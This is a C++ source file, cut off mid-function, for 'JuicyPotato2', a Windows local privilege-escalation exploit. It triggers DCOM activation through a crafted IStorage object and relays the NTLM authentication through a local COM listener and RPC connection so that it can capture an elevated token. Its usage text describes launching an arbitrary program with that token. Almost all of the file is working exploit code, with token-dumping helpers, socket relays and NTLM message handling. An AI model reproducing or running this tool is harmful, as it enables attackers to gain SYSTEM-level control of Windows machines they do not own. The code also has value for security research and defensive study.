// juicy_2.cpp : This file contains the 'main' function. Program execution begins and ends there.
#include "stdafx.h"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h> 
#include <UserEnv.h>
#include <assert.h>
#include <tchar.h>
#include <windows.h>
#include <aclapi.h>
#include <accctrl.h>
#include <stdio.h>
#include <assert.h>
#include <tchar.h>
#include <WinSafer.h>
#include "MSFRottenPotato.h"
#include "IStorageTrigger.h"

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment(lib, "userenv.lib")

int RunRogueOxidResolver(char*);

int Juicy(wchar_t*, BOOL);
wchar_t* olestr;
wchar_t* g_port;
wchar_t* rpcserver;
wchar_t* rpcport;
char dcom_port[64];
char dcom_ip[17];
char redirect_server[17];
char oxidport[12];
char myhost[24];
char dummyrpc[24];
static const char VERSION[] = "0.1";
BOOL TEST_mode = FALSE;
HANDLE elevated_token, duped_token;

int PotatoAPI::newConnection;
wchar_t* processtype = NULL;
wchar_t* processargs = NULL;
wchar_t* processname = NULL;
BOOL DumpToken(HANDLE Token)
{
	unsigned int i;
	DWORD Size, UserSize, DomainSize;
	SID* sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64], PrivilegeName[64];

	DWORD SessionID;
	TOKEN_TYPE Type;
	TOKEN_STATISTICS* Statistics;
	TOKEN_SOURCE Source;
	TOKEN_OWNER* Owner;
	TOKEN_USER* User;
	TOKEN_PRIMARY_GROUP* PrimaryGroup;
	TOKEN_DEFAULT_DACL* DefaultDacl;
	TOKEN_PRIVILEGES* Privileges;
	PTOKEN_GROUPS* Groups;
	SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;

	DWORD EntryCount;
	EXPLICIT_ACCESS* ExplicitEntries, * ExplicitEntry;

	memset(PrivilegeName, 0, sizeof(PrivilegeName));
	memset(UserName, 0, sizeof(UserName));
	memset(DomainName, 0, sizeof(DomainName));

	//_tprintf(_T("----------------------------------\n"));
	//_tprintf(_T("This is a %s token\n"), IsTokenRestricted(Token) ? _T("restricted") : _T("unrestricted"));

	/////////////////////////////////////////////////////////////////
	// Dump token type

	Size = 0;
	GetTokenInformation(Token, TokenType, &Type, sizeof(TOKEN_TYPE), &Size);
	if (!Size)
	{
		//_tprintf(_T("Error getting token type: error code 0x%lx\n"), GetLastError());
		return FALSE;
	}

	//_tprintf(_T("Token type: "));
	if (Type == TokenPrimary) _tprintf(_T("primary;"));
	else _tprintf(_T("impersonation;"));

	if (Type == TokenImpersonation)
	{
		Size = 0;
		if (!GetTokenInformation(Token, TokenImpersonationLevel, &ImpersonationLevel, sizeof(SECURITY_IMPERSONATION_LEVEL), &Size) || !Size)
		{
			_tprintf(_T("Error getting impersonation level: error code 0x%lx\n"), GetLastError());
			return FALSE;
		}

		//_tprintf(_T("Impersonation level: "));
		switch (ImpersonationLevel)
		{
		case SecurityAnonymous:
			_tprintf(_T("anonymous\n"));
			break;
		case SecurityIdentification:
			_tprintf(_T("identification\n"));
			break;
		case SecurityImpersonation:
			_tprintf(_T("impersonation\n"));
			break;
		case SecurityDelegation:
			_tprintf(_T("delegation\n"));
			break;
		}
	}
	return TRUE;
	/////////////////////////////////////////////////////////////////
	// Dump the token IDs

	// Get the Token and Authentication IDs
	Size = 0;
	GetTokenInformation(Token, TokenStatistics, NULL, 0, &Size);
	if (!Size)
	{
		_tprintf(_T("Error getting token statistics: error code 0x%lx\n"), GetLastError());
		return FALSE;
	}

	Statistics = (TOKEN_STATISTICS*)malloc(Size);
	assert(Statistics);
	GetTokenInformation(Token, TokenStatistics, Statistics, Size, &Size);
	assert(Size);
	_tprintf(_T("Token ID: 0x%lx\n"), Statistics->TokenId.LowPart);
	_tprintf(_T("Authentication ID: 0x%lx 0x%lx\n"), Statistics->AuthenticationId.LowPart, Statistics->AuthenticationId.HighPart);
	free(Statistics);

	Size = 0;

	Size = 0;
	GetTokenInformation(Token, TokenOrigin, NULL, 0, &Size);
	if (!Size)
	{
		_tprintf(_T("Error getting token statistics: error code 0x%lx\n"), GetLastError());
		return FALSE;
	}

	TOKEN_ORIGIN* to;
	to = (TOKEN_ORIGIN*)malloc(Size);
	assert(to);
	GetTokenInformation(Token, TokenOrigin, to, Size, &Size);
	assert(Size);

	_tprintf(_T("Origin ID: 0x%lx 0x%lx\n"), to->OriginatingLogonSession.LowPart, to->OriginatingLogonSession.HighPart);
	free(to);
	Size = 0;

	if (!GetTokenInformation(Token, TokenSessionId, &SessionID, sizeof(SessionID), &Size) || !Size)
	{
		_tprintf(_T("Error getting the Session ID: error code 0x%lx\n"), GetLastError());
		return FALSE;
	}
	if (SessionID) _tprintf(_T("Session ID = 0x%lx\n"), SessionID);

	/////////////////////////////////////////////////////////////////
	// Dump token owner

	Size = 0;
	GetTokenInformation(Token, TokenOwner, NULL, 0, &Size);
	if (!Size)
	{
		_tprintf(_T("Error getting token owner: error code0x%lx\n"), GetLastError());
		return FALSE;
	}

	Owner = (TOKEN_OWNER*)malloc(Size);
	assert(Owner);
	GetTokenInformation(Token, TokenOwner, Owner, Size, &Size);
	assert(Size);

	Size = GetLengthSid(Owner->Owner);
	assert(Size);

	sid = (SID*)malloc(Size);
	assert(sid);

	CopySid(Size, sid, Owner->Owner);

	UserSize = (sizeof UserName / sizeof * UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof * DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);

	_tprintf(_T("Token's owner: %s\\%s "), DomainName, UserName);
	switch (SidType)
	{
	case SidTypeUser:
		_tprintf(_T("(user)\n"));
		break;
	case SidTypeGroup:
		_tprintf(_T("(group)\n"));
		break;
	case SidTypeDomain:
		_tprintf(_T("(domain)\n"));
		break;
	case SidTypeAlias:
		_tprintf(_T("(alias)\n"));
		break;
	case SidTypeWellKnownGroup:
		_tprintf(_T("(well-known group)\n"));
		break;
	case SidTypeDeletedAccount:
		_tprintf(_T("(deleted account)\n"));
		break;
	case SidTypeInvalid:
		_tprintf(_T("(invalid)\n"));
		break;
	case SidTypeUnknown:
		_tprintf(_T("(unknown)\n"));
		break;
	case SidTypeComputer:
		_tprintf(_T("(computer)\n"));
		break;
	}

	free(Owner);

	/////////////////////////////////////////////////////////////////
	// Dump token source

	Size = 0;
	if (!GetTokenInformation(Token, TokenSource, &Source, sizeof(TOKEN_SOURCE), &Size) || !Size)
	{
		_tprintf(_T("Error getting token source: error code 0x%lx\n"), GetLastError());
		return FALSE;
	}

	_tprintf(_T("Token's source: "));
	for (i = 0; i < 8 && Source.SourceName[i]; i++) _tprintf(_T("%c"), Source.SourceName[i]);
	_tprintf(_T(" (0x%lx)\n"), Source.SourceIdentifier.LowPart);

	/////////////////////////////////////////////////////////////////
	// Dump token user

	Size = 0;
	GetTokenInformation(Token, TokenUser, NULL, 0, &Size);
	if (!Size)
	{
		_tprintf(_T("Error getting token user: error code 0x%lx\n"), GetLastError());
		return FALSE;
	}

	User = (TOKEN_USER*)malloc(Size);
	assert(User);
	GetTokenInformation(Token, TokenUser, User, Size, &Size);
	assert(Size);

	Size = GetLengthSid(User->User.Sid);
	assert(Size);

	sid = (SID*)malloc(Size);
	assert(sid);

	CopySid(Size, sid, User->User.Sid);
	UserSize = (sizeof UserName / sizeof * UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof * DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);

	_tprintf(_T("Token's user: %s\\%s "), DomainName, UserName);
	switch (SidType)
	{
	case SidTypeUser:
		_tprintf(_T("(user)\n"));
		break;
	case SidTypeGroup:
		_tprintf(_T("(group)\n"));
		break;
	case SidTypeDomain:
		_tprintf(_T("(domain)\n"));
		break;
	case SidTypeAlias:
		_tprintf(_T("(alias)\n"));
		break;
	case SidTypeWellKnownGroup:
		_tprintf(_T("(well-known group)\n"));
		break;
	case SidTypeDeletedAccount:
		_tprintf(_T("(deleted account)\n"));
		break;
	case SidTypeInvalid:
		_tprintf(_T("(invalid)\n"));
		break;
	case SidTypeUnknown:
		_tprintf(_T("(unknown)\n"));
		break;
	case SidTypeComputer:
		_tprintf(_T("(computer)\n"));
		break;
	}

	free(User);

	/////////////////////////////////////////////////////////////////
	// Primary group

	Size = 0;
	GetTokenInformation(Token, TokenPrimaryGroup, NULL, 0, &Size);
	if (!Size)
	{
		_tprintf(_T("Error getting primary group: error code 0x%lx\n"), GetLastError());
		return FALSE;
	}

	PrimaryGroup = (TOKEN_PRIMARY_GROUP*)malloc(Size);
	assert(PrimaryGroup);
	GetTokenInformation(Token, TokenPrimaryGroup, PrimaryGroup, Size, &Size);
	assert(Size);

	Size = GetLengthSid(PrimaryGroup->PrimaryGroup);
	assert(Size);

	sid = (SID*)malloc(Size);
	assert(sid);

	CopySid(Size, sid, PrimaryGroup->PrimaryGroup);

	UserSize = (sizeof UserName / sizeof * UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof * DomainName) - 1;

	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);

	_tprintf(_T("Token's primary group: %s\\%s "), DomainName, UserName);
	switch (SidType)
	{
	case SidTypeUser:
		_tprintf(_T("(user)\n"));
		break;
	case SidTypeGroup:
		_tprintf(_T("(group)\n"));
		break;
	case SidTypeDomain:
		_tprintf(_T("(domain)\n"));
		break;
	case SidTypeAlias:
		_tprintf(_T("(alias)\n"));
		break;
	case SidTypeWellKnownGroup:
		_tprintf(_T("(well-known group)\n"));
		break;
	case SidTypeDeletedAccount:
		_tprintf(_T("(deleted account)\n"));
		break;
	case SidTypeInvalid:
		_tprintf(_T("(invalid)\n"));
		break;
	case SidTypeUnknown:
		_tprintf(_T("(unknown)\n"));
		break;
	case SidTypeComputer:
		_tprintf(_T("(computer)\n"));
		break;
	}

	free(PrimaryGroup);

	/////////////////////////////////////////////////////////////////
	// Dump default dacl
	/*
	Size = 0;
	GetTokenInformation(Token, TokenDefaultDacl, NULL, 0, &Size);
	if (!Size)
	{
		_tprintf(_T("Error getting default DACL: error code 0x%lx\n"), GetLastError());
		return FALSE;
	}

	DefaultDacl = (TOKEN_DEFAULT_DACL *)malloc(Size);
	assert(DefaultDacl);

	GetTokenInformation(Token, TokenDefaultDacl, DefaultDacl, Size, &Size);
	assert(Size);
	_tprintf(_T("Default DACL (%d bytes):\n"), DefaultDacl->DefaultDacl->AclSize);
	_tprintf(_T("ACE count: %d\n"), DefaultDacl->DefaultDacl->AceCount);

	if (GetExplicitEntriesFromAcl(DefaultDacl->DefaultDacl, &EntryCount, &ExplicitEntries) != ERROR_SUCCESS)
	{
		_tprintf(_T("GetExplicitEntriesFromAcl failed: error code 0x%lx\n"), GetLastError());
		return FALSE;
	}

	for (i = 0, ExplicitEntry = ExplicitEntries; i < EntryCount; i++, ExplicitEntry++)
	{
		_tprintf(_T("ACE %d:\n"), i);

		_tprintf(_T("  Applies to: "));
		if (ExplicitEntry->Trustee.TrusteeForm == TRUSTEE_BAD_FORM) _tprintf(_T("trustee is in bad form\n"));
		else if (ExplicitEntry->Trustee.TrusteeForm == TRUSTEE_IS_NAME) _tprintf(_T("%s "), ExplicitEntry->Trustee.ptstrName);
		else if (ExplicitEntry->Trustee.TrusteeForm == TRUSTEE_IS_SID)
		{
			Size = GetLengthSid((SID *)ExplicitEntry->Trustee.ptstrName);
			assert(Size);
			sid = (SID *)malloc(Size);
			assert(sid);
			CopySid(Size, sid, (SID *)ExplicitEntry->Trustee.ptstrName);
			UserSize = (sizeof UserName / sizeof *UserName) - 1;
			DomainSize = (sizeof DomainName / sizeof *DomainName) - 1;
			LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
			free(sid);

			_tprintf(_T("%s\\%s "), DomainName, UserName);
		}
		else
		{
			_tprintf(_T("Unhandled trustee form %d\n"), ExplicitEntry->Trustee.TrusteeForm);
			return FALSE;
		}

		switch (ExplicitEntry->Trustee.TrusteeType)
		{
		case TRUSTEE_IS_USER:
			_tprintf(_T("(user)\n"));
			break;
		case TRUSTEE_IS_GROUP:
			_tprintf(_T("(group)\n"));
			break;
		case TRUSTEE_IS_DOMAIN:
			_tprintf(_T("(domain)\n"));
			break;
		case TRUSTEE_IS_ALIAS:
			_tprintf(_T("(alias)\n"));
			break;
		case TRUSTEE_IS_WELL_KNOWN_GROUP:
			_tprintf(_T("(well-known group)\n"));
			break;
		case TRUSTEE_IS_DELETED:
			_tprintf(_T("(deleted)\n"));
			break;
		case TRUSTEE_IS_INVALID:
			_tprintf(_T("(invalid)\n"));
			break;
		case TRUSTEE_IS_UNKNOWN:
			_tprintf(_T("(unknown)\n"));
			break;
		}

		_tprintf(_T("  ACE inherited by: "));
		if (!ExplicitEntry->grfInheritance) _tprintf(_T("not inheritable"));
		if (ExplicitEntry->grfInheritance & CONTAINER_INHERIT_ACE) _tprintf(_T("[containers] "));
		if (ExplicitEntry->grfInheritance & INHERIT_ONLY_ACE) _tprintf(_T("[inherited objects]"));
		if (ExplicitEntry->grfInheritance & NO_PROPAGATE_INHERIT_ACE) _tprintf(_T("[inheritance flags not propagated] "));
		if (ExplicitEntry->grfInheritance & OBJECT_INHERIT_ACE) _tprintf(_T("[objects] "));
		if (ExplicitEntry->grfInheritance & SUB_CONTAINERS_AND_OBJECTS_INHERIT) _tprintf(_T("[containers and objects] "));
		if (ExplicitEntry->grfInheritance & SUB_CONTAINERS_ONLY_INHERIT) _tprintf(_T("[sub-containers] "));
		if (ExplicitEntry->grfInheritance & SUB_OBJECTS_ONLY_INHERIT) _tprintf(_T("[sub-objects] "));
		_tprintf(_T("\n"));

		_tprintf(_T("  Access permission mask = 0x%08lx\n"), ExplicitEntry->grfAccessPermissions);
		_tprintf(_T("  Access mode: "));
		switch (ExplicitEntry->grfAccessMode)
		{
		case GRANT_ACCESS:
			_tprintf(_T("grant access\n"));
			break;
		case SET_ACCESS:
			_tprintf(_T("set access (discards any previous controls)\n"));
			break;
		case DENY_ACCESS:
			_tprintf(_T("deny access\n"));
			break;
		case REVOKE_ACCESS:
			_tprintf(_T("revoke access (discards any previous controls)\n"));
			break;
		case SET_AUDIT_SUCCESS:
			_tprintf(_T("generate success audit event\n"));
			break;
		case SET_AUDIT_FAILURE:
			_tprintf(_T("generate failure audit event\n"));
			break;
		}
	}

	LocalFree(ExplicitEntries);
	free(DefaultDacl);

	*/
	// Dump restricted SIDs

	Size = 0;
	DWORD dwSize = 0;
	PTOKEN_GROUPS pGroupInfo;
	PTOKEN_USER pUserInfo = NULL;
	GetTokenInformation(Token, TokenUser, NULL, dwSize, &dwSize);
	if (pUserInfo = (PTOKEN_USER)GlobalAlloc(GPTR, dwSize))
	{
		// Call GetTokenInformation again to get the group information.
		if (!GetTokenInformation(Token, TokenUser, pUserInfo, dwSize, &dwSize))
		{
			GlobalFree(pUserInfo);
			pUserInfo = NULL;
		}
	}
	dwSize = 0;
	GetTokenInformation(Token, TokenGroups, NULL, dwSize, &dwSize);
	/*
	if (pGroupInfo = (PTOKEN_GROUPS)GlobalAlloc(GPTR, dwSize))
	{
		if (GetTokenInformation(Token, TokenGroups, pGroupInfo, dwSize, &dwSize))
		{
			static WCHAR szName[1024], szDomain[1024];
			printf("GROUPS:%d\n", i);
			for (i = 0; i < pGroupInfo->GroupCount; i++)
			{
				//printf("%d\n", pGroupInfo->Groups[i].Sid);
				if (pGroupInfo->Groups[i].Attributes & SE_GROUP_ENABLED)
				{
					//printf("%d\n", pGroupInfo->Groups[i].Sid);
					BOOL bEqual = TRUE;
					if (1 == 1/*EqualDomainSid(pUserInfo->User.Sid, pGroupInfo->Groups[i].Sid, &bEqual))
					{
						if (bEqual)
						{
							DWORD   dwName, dwDomain;
							SID_NAME_USE SidNameUse;
							dwName = 1024;
							dwDomain = 1024;
							if (LookupAccountSid(NULL, pGroupInfo->Groups[i].Sid, (LPSTR)szName, &dwName, (LPSTR)szDomain, &dwDomain, &SidNameUse))
								wprintf(L"\t%s\n", szName);
						}
					}
				}
			}
		}
		GlobalFree(pGroupInfo);
	}
	*/
	/////////////////////////////////////////////////////////////////
	// Dump privileges
/*
	Size = 0;
	GetTokenInformation(Token, TokenPrivileges, NULL, 0, &Size);
	if (!Size)
	{
		_tprintf(_T("Error getting token privileges: error code 0x%lx\n"), GetLastError());
		return FALSE;
	}

	Privileges = (TOKEN_PRIVILEGES *)malloc(Size);
	assert(Privileges);
	GetTokenInformation(Token, TokenPrivileges, Privileges, Size, &Size);
	assert(Size);

	if (Privileges->PrivilegeCount) _tprintf(_T("Token's privileges (%d total):\n"), Privileges->PrivilegeCount
	for (i = 0; i < Privileges->PrivilegeCount; i++)
	{
		Size = (sizeof PrivilegeName / sizeof *PrivilegeName) - 1;
		LookupPrivilegeName(NULL, &Privileges->Privileges[i].Luid, PrivilegeName, &Size);

		_tprintf(_T("  %s (0x%lx) = "), PrivilegeName, Privileges->Privileges[i].Luid.LowPart);
		if (!Privileges->Privileges[i].Attributes) _tprintf(_T("disabled"));
		if (Privileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)
		{
			if (Privileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT) _tprintf(_T("[enabled by default] "));
			else _tprintf(_T("[enabled] "));
		}
		if (Privileges->Privileges[i].Attributes & SE_PRIVILEGE_USED_FOR_ACCESS) _tprintf(_T("used for access] "));
		_tprintf(_T("\n"));
	}

	free(Privileges);
*/
/////////////////////////////////////////////////////////////////
	_tprintf(_T("\n"));

	return TRUE;
}
void getUser() {
	TCHAR  buffer[64];
	DWORD k = 64;
	GetUserName(buffer, &k);
	printf("\n[i] user=%S\n", buffer);
}
int IsTokenAnonymous(HANDLE tok)
{
	DWORD Size, UserSize, DomainSize;
	SID* sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64];
	TOKEN_USER* User;
	Size = 0;
	//getUser();
	GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
	if (!Size)
		return FALSE;

	User = (TOKEN_USER*)malloc(Size);
	assert(User);
	GetTokenInformation(tok, TokenUser, User, Size, &Size);
	assert(Size);
	Size = GetLengthSid(User->User.Sid);
	assert(Size);
	sid = (SID*)malloc(Size);
	assert(sid);

	CopySid(Size, sid, User->User.Sid);
	UserSize = (sizeof UserName / sizeof * UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof * DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);
	if (!_wcsicmp(UserName, L"ANONYMOUS LOGON"))
		return 1;
    printf("%S;%S\\%S;", olestr, DomainName, UserName);
	//if (!_wcsicmp(UserName, L"SYSTEM"))
		return 0;

	return 0;
}

void usage()
{
	printf("JuicyPotato2 v%s \n\n", VERSION);

	printf("Mandatory args: \n"
		"-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both\n"
		"-p <program>: program to launch\n"
		"-l <port>: COM server listen port\n"
		);

	printf("\n\n");
	printf("Optional args: \n"
		"-m <ip>: COM server listen address (default 127.0.0.1)\n"
		"-a <argument>: command line argument to pass to program (default NULL)\n"
		"-k <ip>: RPC server ip address (default 127.0.0.1)\n"
		"-n <port>: RPC server listen port (default 135)\n"
		"-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})\n"
		"-z only test CLSID and print token's user\n"
		"-l <port> local fake oxid resolver port\n"
		"-x <ip> forwarder listening on port 135 for redirecting to fake oxid resolver ip/port\n"

		);
}

PotatoAPI::PotatoAPI() {
	comSendQ = new BlockingQueue<char*>();
	rpcSendQ = new BlockingQueue<char*>();
	newConnection = 0;
	negotiator = new LocalNegotiator();
	return;
}

DWORD PotatoAPI::startRPCConnectionThread() {
	DWORD ThreadID;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)staticStartRPCConnection, (void*)this, 0, &ThreadID);
	return ThreadID;
}

DWORD PotatoAPI::startCOMListenerThread() {
	DWORD ThreadID;
	HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)staticStartCOMListener, (void*)this, 0, &ThreadID);

	return ThreadID;
}

DWORD WINAPI PotatoAPI::staticStartRPCConnection(void* Param) {
	PotatoAPI* This = (PotatoAPI*)Param;
	return This->startRPCConnection();
}

DWORD WINAPI PotatoAPI::staticStartCOMListener(void* Param) {
	PotatoAPI* This = (PotatoAPI*)Param;
	return This->startCOMListener();
}

int PotatoAPI::findNTLMBytes(char* bytes, int len) {
	//Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.
	//The NTLM bytes (for our purposes) are always at the end of the packet, so when we find the header,
	//we can just return the index
	char pattern[7] = { 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50 };
	int pIdx = 0;
	int i;
	for (i = 0; i < len; i++) {
		if (bytes[i] == pattern[pIdx]) {
			pIdx = pIdx + 1;
			if (pIdx == 7) return (i - 6);
		}
		else {
			pIdx = 0;
		}
	}
	return -1;
}

int PotatoAPI::processNtlmBytes(char* bytes, int len) {
	int ntlmLoc = findNTLMBytes(bytes, len);
	int messageType;
	char type_3[] = {
		   0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
		   0x03,0x00,0x00,0x00,
		   0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
		   0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
		   0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
		   0x00,0x00
	};
	//printf("\nNTLM LEN ==%d %d\n",len, ntlmLoc);
	if (ntlmLoc == -1) return -1;
	/*if (len == 0)
		printf("NTLM LEN ==0\n");


	if (len == 0)
		messageType = 3;
	else*/
	messageType = bytes[ntlmLoc + 8];
	//printf("mssage tyoe%d\n", messageType);
	switch (messageType) {
	case 1:
		//NTLM type 1 message

		negotiator->handleType1(bytes + ntlmLoc, len - ntlmLoc);
		break;
	case 2:
		//NTLM type 2 message

		negotiator->handleType2(bytes + ntlmLoc, len - ntlmLoc);
		break;
	case 3:
		//NTLM type 3 message

		negotiator->handleType3(bytes + ntlmLoc, len - ntlmLoc);
		break;
	default:
		printf("Error - Unknown NTLM message type...");
		return -1;
		break;
	}
	return 0;
}

int checkForNewConnection(SOCKET* ListenSocket, SOCKET* ClientSocket) {
	fd_set readSet;
	FD_ZERO(&readSet);
	FD_SET(*ListenSocket, &readSet);
	timeval timeout;
	timeout.tv_sec = 1;  // Zero timeout (poll)
	timeout.tv_usec = 0;
	if (select(*ListenSocket, &readSet, NULL, NULL, &timeout) == 1) {
		*ClientSocket = accept(*ListenSocket, NULL, NULL);
		return 1;
	}
	return 0;
}

int PotatoAPI::triggerDCOM(void)
{
	CoInitialize(nullptr);

	//Create IStorage object
	IStorage* stg = NULL;
	ILockBytes* lb = NULL;
	HRESULT res;
	
	res = CreateILockBytesOnHGlobal(NULL, true, &lb);
	res = StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);

	//Initialze IStorageTrigger object
	IStorageTrigger* t = new IStorageTrigger(stg);

	CLSID clsid;
	CLSIDFromString(olestr, &clsid);
	CLSID tmp;
	//IUnknown IID
	CLSIDFromString(OLESTR("{00000000-0000-0000-C000-000000000046}"), &tmp);
	MULTI_QI qis[1];
	qis[0].pIID = &tmp;
	qis[0].pItf = NULL;
	qis[0].hr = 0;

	//Call CoGetInstanceFromIStorage
	HRESULT status = CoGetInstanceFromIStorage(NULL, &clsid, NULL, CLSCTX_LOCAL_SERVER, t, 1, qis);
	
	fflush(stdout);
	return 0;
}

int PotatoAPI::startRPCConnection(void) {
	const int DEFAULT_BUFLEN = 4096;

	fflush(stdout);
	WSADATA wsaData;
	
	struct addrinfo* result = NULL,
		* ptr = NULL,
		hints;

	char* sendbuf;
	char recvbuf[DEFAULT_BUFLEN];
	int iResult;
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	char myport[12];

	if (rpcserver != NULL) {
		memset(myhost, 0, 24);
		wcstombs(myhost, rpcserver, 24);
	}
	else {
		strcpy(myhost, "127.0.0.1");
	}

	if (rpcport != NULL) {
		memset(myport, 0, 12);
		wcstombs(myport, rpcport, 12);
	}
	else {
		strcpy(myport, "135");
	}

	iResult = getaddrinfo(myhost, myport, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to an address
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// Connect to server
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}

		break;
	}

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	// Send/Receive until the peer closes the connection
	fflush(stdout);
	
	do {
		//Monitor our sendQ until we have some data to send
		int* len = (int*)rpcSendQ->wait_pop();

		fflush(stdout);
		sendbuf = rpcSendQ->wait_pop();

		//Check if we should be opening a new socket before we send the data
		if (newConnection == 1) {
			ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
			int y = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
			newConnection = 0;
		}

		iResult = send(ConnectSocket, sendbuf, *len, 0);
		if (iResult == SOCKET_ERROR) {
			printf("RPC -> send failed with error: %d\n", WSAGetLastError());
			closesocket(ConnectSocket);
			WSACleanup();
			return 0;
		}

		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {

			comSendQ->push((char*)&iResult);
			comSendQ->push(recvbuf);
		}
		else if (iResult == 0) {
			printf("RPC-> Connection closed\n");
		}
		else {
			printf("RPC -> recv failed with error: %d\n", WSAGetLastError());
			return 0;
		}

	} while (iResult > 0);

	//printf("last iResult:%d\n", iResult);
	fflush(stdout);
	// cleanup
	iResult = shutdown(ConnectSocket, SD_SEND);
	closesocket(ConnectSocket);
	WSACleanup();

	return 0;
}

int PotatoAPI::startCOMListener(void) {
	const int DEFAULT_BUFLEN = 4096;
	WSADATA wsaData;
	int iResult;
	struct addrinfo* result = NULL;
	struct addrinfo hints;
	int iSendResult;
	char* sendbuf;
	char recvbuf[DEFAULT_BUFLEN];
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	memset(dcom_port, 0, 64);
	wcstombs(dcom_port, g_port, 12);

	//printf("[+] Listening on port:%s\n", dcom_port);
	// Resolve the server address and port
	iResult = getaddrinfo(NULL, dcom_port, &hints, &result);

	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Create a SOCKET for connecting to server
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	int optval = 1;
	setsockopt(ListenSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&optval, sizeof(optval));

	if (ListenSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	//printf("startCOMListener bindresult%d\n", iResult);
	if (iResult == SOCKET_ERROR) {
		printf("bind failed with error: %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);

	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		printf("listen failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}
	
	//---- non block socket server
	
	timeval timeout = { 1, 0 };
	fd_set fds;
	FD_ZERO(&fds);
	FD_SET(ListenSocket, &fds);

	select(ListenSocket + 1, &fds, NULL, NULL, &timeout);
	if (FD_ISSET(ListenSocket, &fds))
	{
		ClientSocket = accept(ListenSocket, NULL, NULL);
		if (ClientSocket == INVALID_SOCKET) {
			printf("accept failed with error: %d\n", WSAGetLastError());
			closesocket(ListenSocket);
			WSACleanup();
			return 1;
		}
	}
	/*
	ClientSocket = accept(ListenSocket, NULL, NULL);
	if (ClientSocket == INVALID_SOCKET) {
		printf("accept failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}*/
	int ntlmLoc;
	do {
		iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {

			if (!TEST_mode)
				printf(".", iResult);

